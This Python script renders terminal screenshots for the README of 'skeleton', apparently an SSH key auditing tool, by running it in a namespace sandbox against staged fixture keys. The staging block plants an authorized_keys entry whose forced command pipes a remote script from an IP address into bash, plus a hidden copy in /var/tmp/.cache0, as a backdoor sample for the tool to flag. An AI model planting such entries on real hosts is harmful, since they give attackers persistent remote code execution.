#!/usr/bin/env python3
"""capture_skeleton.py — render clean terminal shots for the README.

runs skeleton inside an isolated user+mount namespace (tmpfs /home and
/var/tmp), HOME=/home/brerabin, forced ansi color; parses the SGR stream
and paints pngs with PIL. no host path ever enters the frames.
"""
import os, re, shutil, subprocess, sys

BIN = os.path.abspath(sys.argv[1])
ASSETS = os.path.abspath(sys.argv[2])
FIXDIR = os.path.abspath(sys.argv[3])
FONT = "/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf"
BG = (16, 20, 26)
FG = (208, 214, 222)

STAGE = r"""
mount --make-rprivate /
mount -t tmpfs none /home
mount -t tmpfs none /var/tmp
mkdir -p -m 700 /home/brerabin/.ssh && mkdir -p -m 700 /var/tmp/.cache0
cp /tmp/skstage/skeleton /home/brerabin/skeleton
chmod 755 /home/brerabin/skeleton
cp /tmp/skstage/fixtures/id_ed25519     /home/brerabin/.ssh/id_ed25519
cp /tmp/skstage/fixtures/id_ed25519.pub /home/brerabin/.ssh/id_ed25519.pub
cp /tmp/skstage/fixtures/id_enc         /home/brerabin/.ssh/id_backup
cp /tmp/skstage/fixtures/id_rsa1024.pub /home/brerabin/.ssh/id_rsa.old.pub
chmod 600 /home/brerabin/.ssh/id_ed25519 /home/brerabin/.ssh/id_backup
{
  cat /tmp/skstage/fixtures/id_ecdsa.pub
  printf 'command="bash -c \\"curl -s http://185.199.108.153/p.sh|bash\\"" %s\n' "$(cat /tmp/skstage/fixtures/id_rsa2048.pub)"
} > /home/brerabin/.ssh/authorized_keys
chmod 600 /home/brerabin/.ssh/authorized_keys
cp /home/brerabin/.ssh/authorized_keys /var/tmp/.cache0/authorized_keys
chmod 600 /var/tmp/.cache0/authorized_keys
printf '#!/bin/sh\n/usr/bin/logger -t sshd-login $USER\n' > /home/brerabin/.ssh/rc
chmod 600 /home/brerabin/.ssh/rc
chmod 700 /var/tmp/.cache0
export HOME=/home/brerabin
cd $HOME
"""

SCENES = [
    ("terminal_keys.png", "keys",
     "/home/brerabin/.ssh/id_rsa.old.pub /home/brerabin/.ssh/id_ed25519 /home/brerabin/.ssh/id_backup"),
    ("terminal_authorized.png", "authorized",
     "/home/brerabin/.ssh/authorized_keys"),
    ("terminal_sweep.png", "sweep",
     "/home/brerabin /var/tmp"),
]


def ansi_to_lines(text):
    token = re.compile("\x1b\\[([0-9;]*)m")
    lines = []
    for raw in text.split("\n"):
        runs, pos, cur, col = [], 0, "", FG
        for m in token.finditer(raw):
            cur += raw[pos:m.start()]
            pos = m.end()
            code = m.group(1)
            if code in ("0", ""):
                col = FG
            elif code == "1;31":
                col = (235, 87, 87)
            elif code == "33":
                col = (240, 180, 60)
            elif code == "36":
                col = (80, 200, 210)
            elif code == "90":
                col = (110, 118, 130)
            elif code == "32":
                col = (98, 190, 120)
            runs.append((len(cur), col))
        cur += raw[pos:]
        lines.append((cur, runs))
    return lines


def render(text, out, title):
    from PIL import Image, ImageDraw, ImageFont
    lines = ansi_to_lines(text.rstrip("\n"))
    fs = 15
    font = ImageFont.truetype(FONT, fs)
    pad, lh, cw = 18, fs + 6, 9
    width = max(760, max((len(l) for l, _ in lines), default=0) * cw + pad * 2)
    height = 26 + pad * 2 + lh * len(lines)
    img = Image.new("RGB", (width, height), BG)
    d = ImageDraw.Draw(img)
    d.rectangle([0, 0, width, 26], fill=(30, 36, 44))
    for i, c in enumerate([(255, 95, 86), (255, 189, 46), (39, 201, 63)]):
        d.ellipse([10 + i * 18, 8, 20 + i * 18, 18], fill=c)
    d.text((width // 2 - 70, 6), title, font=font, fill=(140, 150, 165))
    y = 26 + pad
    for line, runs in lines:
        x, cut = pad, 0
        for at, col in runs + [(len(line), FG)]:
            if at > cut:
                d.text((x, y), line[cut:at], font=font, fill=col)
                x += (at - cut) * cw
                cut = at
        y += lh
    img.save(out)
    print("wrote", os.path.basename(out), img.size)


def shq(s):
    return "'" + s.replace("'", "'\\''") + "'"


stage_dir = "/tmp/skstage"
shutil.rmtree(stage_dir, ignore_errors=True)
os.makedirs(stage_dir)
shutil.copy(BIN, stage_dir + "/skeleton")
shutil.copytree(FIXDIR, stage_dir + "/fixtures")

for fname, cmd, args in SCENES:
    scene = STAGE + "SKELETON_FORCE_COLOR=1 $HOME/skeleton " + cmd + " " + args
    outer = subprocess.run(
        ["unshare", "-rm", "bash", "-c", "bash -c " + shq(scene)],
        capture_output=True, text=True)
    if outer.returncode not in (0, 1, 2, 3):   # 0-3 are verdict exit codes
        print("SCENE FAILED", fname, outer.stderr[-1200:])
        sys.exit(1)
    render(outer.stdout, os.path.join(ASSETS, fname), "skeleton — " + cmd)
